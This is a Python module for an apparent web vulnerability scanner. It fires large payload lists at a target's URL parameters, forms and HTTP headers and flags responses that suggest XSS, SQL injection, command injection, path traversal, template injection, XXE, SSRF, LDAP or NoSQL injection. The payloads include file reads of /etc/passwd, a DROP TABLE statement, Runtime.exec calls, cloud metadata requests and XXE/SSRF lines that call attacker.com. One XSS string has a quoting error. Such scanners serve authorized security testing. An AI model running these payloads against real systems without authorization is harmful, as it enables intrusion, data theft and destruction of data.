"""
Advanced Fuzzer Module
Intelligent fuzzing with payload generation and response analysis
"""

import asyncio
import requests
import random
import string
import json
from typing import List, Dict, Optional, Any
from urllib.parse import urljoin, urlparse
from rich.console import Console
import validators

from ..core.logger import logger

console = Console()

class AdvancedFuzzer:
    """Advanced fuzzing module with intelligent payload generation."""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update(config.get_headers())
        
        if config.proxy:
            self.session.proxies = {'http': config.proxy, 'https': config.proxy}
    
    async def fuzz_url(self, url: str) -> List[Dict]:
        """Fuzz URL parameters and forms."""
        
        findings = []
        
        try:
            # Get base response for comparison
            base_response = self.session.get(url, timeout=self.config.timeout)
            base_content = base_response.text
            base_status = base_response.status_code
            
            # Generate payloads
            payloads = self._generate_payloads()
            
            # Test URL parameters
            param_findings = await self._fuzz_url_parameters(url, payloads, base_content, base_status)
            findings.extend(param_findings)
            
            # Test forms if any
            form_findings = await self._fuzz_forms(url, payloads, base_content, base_status)
            findings.extend(form_findings)
            
            # Test headers
            header_findings = await self._fuzz_headers(url, payloads, base_content, base_status)
            findings.extend(header_findings)
            
            logger.info(f"Fuzzing completed for {url}: {len(findings)} findings")
            
        except Exception as e:
            logger.error(f"Error fuzzing {url}: {str(e)}")
        
        return findings
    
    def _generate_payloads(self) -> List[Dict]:
        """Generate comprehensive test payloads."""
        
        payloads = []
        
        # XSS Payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'"><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<button onclick=alert('XSS')>Click</button>"
        ]
        
        for payload in xss_payloads:
            payloads.append({
                'type': 'XSS',
                'payload': payload,
                'severity': 'HIGH',
                'description': 'Cross-Site Scripting vulnerability'
            })
        
        # SQL Injection Payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "'; DROP TABLE users;--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND (SELECT * FROM users) = 1--",
            "' OR 1=1 LIMIT 1--",
            "admin'--",
            "admin' #",
            "admin'/*"
        ]
        
        for payload in sql_payloads:
            payloads.append({
                'type': 'SQLi',
                'payload': payload,
                'severity': 'CRITICAL',
                'description': 'SQL Injection vulnerability'
            })
        
        # Command Injection Payloads
        command_payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; ls -la",
            "| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; net user",
            "| net user"
        ]
        
        for payload in command_payloads:
            payloads.append({
                'type': 'Command Injection',
                'payload': payload,
                'severity': 'CRITICAL',
                'description': 'Command Injection vulnerability'
            })
        
        # Path Traversal Payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "/windows/system32/drivers/etc/hosts",
            "file:///etc/passwd",
            "file:///windows/win.ini",
            "php://filter/convert.base64-encode/resource=/etc/passwd"
        ]
        
        for payload in path_payloads:
            payloads.append({
                'type': 'Path Traversal',
                'payload': payload,
                'severity': 'HIGH',
                'description': 'Path Traversal vulnerability'
            })
        
        # Template Injection Payloads
        template_payloads = [
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "${\"z\".concat(\"z\")}",
            "{{\"z\".concat(\"z\")}}",
            "#{\"z\".concat(\"z\")}",
            "${T(java.lang.Runtime).getRuntime().exec(\"id\")}",
            "{{config.__class__.__init__.__globals__}}",
            "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}",
            "${T(java.lang.System).getProperty('os.name')}"
        ]
        
        for payload in template_payloads:
            payloads.append({
                'type': 'Template Injection',
                'payload': payload,
                'severity': 'CRITICAL',
                'description': 'Server-Side Template Injection vulnerability'
            })
        
        # LDAP Injection Payloads
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*",
            "*))(|(objectclass=*",
            "admin)(&(password=*))",
            "admin)(&)",
            "admin)(!(|(password=nothing))"
        ]
        
        for payload in ldap_payloads:
            payloads.append({
                'type': 'LDAP Injection',
                'payload': payload,
                'severity': 'HIGH',
                'description': 'LDAP Injection vulnerability'
            })
        
        # XXE Payloads
        xxe_payloads = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo>test</foo>'
        ]
        
        for payload in xxe_payloads:
            payloads.append({
                'type': 'XXE',
                'payload': payload,
                'severity': 'CRITICAL',
                'description': 'XML External Entity vulnerability'
            })
        
        # SSRF Payloads
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://0.0.0.0:80',
            'http://169.254.169.254/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'file:///etc/passwd',
            'dict://attacker.com:1337/',
            'gopher://attacker.com:1337/'
        ]
        
        for payload in ssrf_payloads:
            payloads.append({
                'type': 'SSRF',
                'payload': payload,
                'severity': 'HIGH',
                'description': 'Server-Side Request Forgery vulnerability'
            })
        
        # NoSQL Injection Payloads
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{}, {}]}',
            '{"$and": [{}, {}]}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$expr": {"$gt": [1, 0]}}'
        ]
        
        for payload in nosql_payloads:
            payloads.append({
                'type': 'NoSQL Injection',
                'payload': payload,
                'severity': 'CRITICAL',
                'description': 'NoSQL Injection vulnerability'
            })
        
        return payloads
    
    async def _fuzz_url_parameters(self, url: str, payloads: List[Dict], base_content: str, base_status: int) -> List[Dict]:
        """Fuzz URL parameters."""
        
        findings = []
        
        try:
            # Parse URL to get parameters
            from urllib.parse import urlparse, parse_qs, urlencode
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return findings
            
            # Test each parameter
            for param_name in params.keys():
                for payload_data in payloads:
                    try:
                        # Create test parameters
                        test_params = params.copy()
                        test_params[param_name] = [payload_data['payload']]
                        
                        # Build test URL
                        test_query = urlencode(test_params, doseq=True)
                        test_url = parsed._replace(query=test_query).geturl()
                        
                        # Make request
                        response = self.session.get(test_url, timeout=self.config.timeout)
                        
                        # Analyze response
                        finding = self._analyze_response(
                            test_url,
                            response,
                            base_content,
                            base_status,
                            payload_data
                        )
                        
                        if finding:
                            findings.append(finding)
                        
                        # Rate limiting
                        await asyncio.sleep(0.1)
                        
                    except requests.exceptions.RequestException:
                        continue
                    except Exception as e:
                        logger.debug(f"Parameter fuzzing error: {str(e)}")
                        continue
        
        except Exception as e:
            logger.error(f"URL parameter fuzzing error: {str(e)}")
        
        return findings
    
    async def _fuzz_forms(self, url: str, payloads: List[Dict], base_content: str, base_status: int) -> List[Dict]:
        """Fuzz forms discovered on the page."""
        
        findings = []
        
        try:
            # Get page content to find forms
            response = self.session.get(url, timeout=self.config.timeout)
            
            # Parse forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                try:
                    # Get form details
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    
                    # Build form URL
                    form_url = urljoin(url, action) if action else url
                    
                    # Get form inputs
                    inputs = {}
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        name = input_tag.get('name')
                        if name:
                            value = input_tag.get('value', '')
                            inputs[name] = value
                    
                    # Test each input
                    for input_name in inputs.keys():
                        for payload_data in payloads:
                            try:
                                # Create test data
                                test_data = inputs.copy()
                                test_data[input_name] = payload_data['payload']
                                
                                # Submit form
                                if method == 'POST':
                                    response = self.session.post(form_url, data=test_data, timeout=self.config.timeout)
                                else:
                                    response = self.session.get(form_url, params=test_data, timeout=self.config.timeout)
                                
                                # Analyze response
                                finding = self._analyze_response(
                                    form_url,
                                    response,
                                    base_content,
                                    base_status,
                                    payload_data,
                                    input_name
                                )
                                
                                if finding:
                                    findings.append(finding)
                                
                                # Rate limiting
                                await asyncio.sleep(0.1)
                                
                            except requests.exceptions.RequestException:
                                continue
                            except Exception as e:
                                logger.debug(f"Form fuzzing error: {str(e)}")
                                continue
                
                except Exception as e:
                    logger.debug(f"Form processing error: {str(e)}")
                    continue
        
        except Exception as e:
            logger.error(f"Form fuzzing error: {str(e)}")
        
        return findings
    
    async def _fuzz_headers(self, url: str, payloads: List[Dict], base_content: str, base_status: int) -> List[Dict]:
        """Fuzz HTTP headers."""
        
        findings = []
        
        # Headers to test
        headers_to_test = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Client-IP',
            'CF-Connecting-IP',
            'True-Client-IP',
            'X-Forwarded-Host',
            'X-Host',
            'X-Original-URL',
            'X-Rewrite-URL'
        ]
        
        for header in headers_to_test:
            for payload_data in payloads:
                try:
                    # Create test headers
                    test_headers = self.config.get_headers().copy()
                    test_headers[header] = payload_data['payload']
                    
                    # Make request
                    response = self.session.get(url, headers=test_headers, timeout=self.config.timeout)
                    
                    # Analyze response
                    finding = self._analyze_response(
                        url,
                        response,
                        base_content,
                        base_status,
                        payload_data,
                        f"Header: {header}"
                    )
                    
                    if finding:
                        findings.append(finding)
                    
                    # Rate limiting
                    await asyncio.sleep(0.1)
                    
                except requests.exceptions.RequestException:
                    continue
                except Exception as e:
                    logger.debug(f"Header fuzzing error: {str(e)}")
                    continue
        
        return findings
    
    def _analyze_response(self, url: str, response: requests.Response, 
                         base_content: str, base_status: int, 
                         payload_data: Dict, parameter: str = "") -> Optional[Dict]:
        """Analyze response for vulnerability indicators."""
        
        try:
            content = response.text
            status_code = response.status_code
            
            # Check for payload reflection (XSS)
            if payload_data['type'] == 'XSS':
                if payload_data['payload'] in content:
                    return {
                        'type': 'XSS',
                        'severity': payload_data['severity'],
                        'url': url,
                        'parameter': parameter,
                        'payload': payload_data['payload'],
                        'description': f"XSS payload reflected in response: {payload_data['description']}",
                        'evidence': {
                            'status_code': status_code,
                            'response_length': len(content),
                            'payload_reflected': True
                        }
                    }
            
            # Check for SQL errors
            sql_errors = [
                'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                'PostgreSQL query failed', 'pg_query', 'pg_exec',
                'ORA-', 'Oracle error', 'Oracle driver',
                'SQLite error', 'sqlite3.error',
                'SQLServer JDBC', 'SqlException',
                'Microsoft OLE DB Provider', 'ODBC SQL Server Driver'
            ]
            
            if payload_data['type'] == 'SQLi':
                for error in sql_errors:
                    if error.lower() in content.lower():
                        return {
                            'type': 'SQLi',
                            'severity': payload_data['severity'],
                            'url': url,
                            'parameter': parameter,
                            'payload': payload_data['payload'],
                            'description': f"SQL error detected: {error}",
                            'evidence': {
                                'status_code': status_code,
                                'response_length': len(content),
                                'sql_error': error
                            }
                        }
            
            # Check for command execution indicators
            if payload_data['type'] == 'Command Injection':
                command_indicators = ['uid=', 'gid=', 'groups=', 'whoami', 'root', 'administrator']
                for indicator in command_indicators:
                    if indicator in content:
                        return {
                            'type': 'Command Injection',
                            'severity': payload_data['severity'],
                            'url': url,
                            'parameter': parameter,
                            'payload': payload_data['payload'],
                            'description': f"Command execution indicator detected: {indicator}",
                            'evidence': {
                                'status_code': status_code,
                                'response_length': len(content),
                                'command_output': indicator
                            }
                        }
            
            # Check for file content (Path Traversal)
            if payload_data['type'] == 'Path Traversal':
                file_indicators = ['root:', 'daemon:', 'nobody:', 'windows', 'win.ini']
                for indicator in file_indicators:
                    if indicator in content:
                        return {
                            'type': 'Path Traversal',
                            'severity': payload_data['severity'],
                            'url': url,
                            'parameter': parameter,
                            'payload': payload_data['payload'],
                            'description': f"File content detected: {indicator}",
                            'evidence': {
                                'status_code': status_code,
                                'response_length': len(content),
                                'file_content': indicator
                            }
                        }
            
            # Check for template injection
            if payload_data['type'] == 'Template Injection':
                if '49' in content or 'zz' in content:
                    return {
                        'type': 'Template Injection',
                        'severity': payload_data['severity'],
                        'url': url,
                        'parameter': parameter,
                        'payload': payload_data['payload'],
                        'description': "Template injection successful - payload evaluated",
                        'evidence': {
                            'status_code': status_code,
                            'response_length': len(content),
                            'template_evaluated': True
                        }
                    }
            
            # Check for unusual response (generic detection)
            if status_code != base_status and status_code >= 500:
                return {
                    'type': 'Potential Vulnerability',
                    'severity': 'MEDIUM',
                    'url': url,
                    'parameter': parameter,
                    'payload': payload_data['payload'],
                    'description': f"Unusual response status: {status_code} (base: {base_status})",
                    'evidence': {
                        'status_code': status_code,
                        'base_status': base_status,
                        'response_length': len(content),
                        'response_diff': abs(len(content) - len(base_content))
                    }
                }
            
            # Check for response length anomalies
            length_diff = abs(len(content) - len(base_content))
            if length_diff > 1000:
                return {
                    'type': 'Response Anomaly',
                    'severity': 'LOW',
                    'url': url,
                    'parameter': parameter,
                    'payload': payload_data['payload'],
                    'description': f"Response length anomaly: {length_diff} characters difference",
                    'evidence': {
                        'status_code': status_code,
                        'base_length': len(base_content),
                        'response_length': len(content),
                        'length_diff': length_diff
                    }
                }
            
        except Exception as e:
            logger.debug(f"Response analysis error: {str(e)}")
        
        return None